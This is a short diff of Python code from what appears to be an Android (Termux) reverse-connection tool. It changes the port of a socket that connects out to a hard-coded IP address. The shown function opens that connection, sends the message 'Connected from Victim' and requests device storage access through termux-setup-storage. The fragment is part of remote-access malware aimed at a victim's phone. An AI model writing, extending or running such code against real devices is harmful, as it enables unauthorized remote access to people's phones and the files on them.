@@ -11,7 +11,7 @@ import os
 def reverse():
 	soc = socket.socket()
 	ip="192.168.225.45" 
-	port=667
+	port=2211
 	soc.connect((ip,port))
 	soc.send(bytes("Connected from Victim","utf-8"))
 	os.system('termux-setup-storage')    #storage access for android
